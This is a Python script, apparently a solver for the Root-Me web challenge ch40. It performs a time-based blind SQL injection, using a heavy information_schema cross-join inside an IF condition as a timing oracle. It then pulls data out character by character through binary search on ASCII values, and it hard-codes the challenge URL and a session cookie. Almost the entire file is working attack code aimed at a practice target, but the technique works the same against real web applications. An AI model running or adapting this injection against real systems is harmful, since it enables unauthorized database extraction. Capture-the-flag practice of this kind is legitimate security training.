#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 51 - TÉCNICA DEL PDF
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class PDFTechnique:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        # Heavy query del PDF
        self.heavy = "(SELECT COUNT(*) FROM information_schema.columns, information_schema.columns T1)"
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=10)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.2)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        """Usa IF del PDF"""
        payload = f"1 AND IF({condition}, {self.heavy}, 0)"
        t = self.test_payload(payload, repeats=3)
        return t > 100  # Umbral alto para heavy query
    
    def extract_char(self, query, pos):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char(query, pos)
            result += char
            print(f"    [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
            time.sleep(0.5)
        return result

# ============================================================
# EJECUCIÓN
# ============================================================
injector = PDFTechnique()

print("="*70)
print("  TÉCNICA DEL PDF - information_schema")
print("="*70)

# 1. Probar heavy query
print("\n[1] Probando heavy query...")
t_heavy = injector.test_payload(f"1 AND IF(1=1, {injector.heavy}, 0)", repeats=3)
t_baseline = injector.test_payload("1", repeats=3)
print(f"  Baseline: {t_baseline:.2f}ms")
print(f"  Heavy: {t_heavy:.2f}ms")

if t_heavy > t_baseline + 50:
    print("  ✅ Heavy query funciona!")
else:
    print("  ❌ Heavy query no funciona")

# 2. Extraer 'admin'
print("\n[2] Extrayendo 'admin'...")
admin = injector.extract_string("SELECT 'admin'", "SELECT 'admin'")
print(f"\n  Resultado: '{admin}'")
